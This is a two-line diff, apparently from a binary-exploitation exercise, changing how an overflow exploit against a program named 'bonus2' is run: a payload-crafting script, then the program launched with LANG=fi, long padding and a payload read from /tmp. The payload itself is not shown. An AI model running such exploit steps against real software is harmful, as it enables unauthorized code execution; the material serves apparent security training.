@@ -1,2 +1,2 @@
-./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(cat /tmp/payload)
-LANG=fi
+python craft_payload.py
+LANG=fi ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(cat /tmp/payload)
